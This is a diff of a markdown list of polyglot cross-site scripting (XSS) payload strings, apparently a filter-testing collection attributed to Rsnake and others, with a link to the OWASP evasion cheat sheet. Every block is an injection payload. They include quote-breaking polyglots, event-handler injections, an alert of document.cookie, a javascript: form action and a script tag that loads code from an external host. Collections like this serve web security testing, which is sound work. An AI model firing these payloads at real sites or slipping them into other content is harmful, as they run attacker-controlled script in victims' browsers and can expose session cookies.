@@ -1,9 +1,23 @@
-# Rsnake polyglot XSS strings
+# Rsnake and others' polyglot XSS strings
 
 ~~~
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
-alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
-></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+~~~
+
+~~~
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+~~~
+
+~~~
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
+<script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
+~~~
+
+~~~
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
+<script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
 ~~~
 
 ~~~
@@ -12,14 +26,6 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 
 ~~~
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
-~~~
-
-~~~
-'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
-<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
-<script>alert(document.cookie)</script>">
-<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">
-<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
 ~~~
 
 More at https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
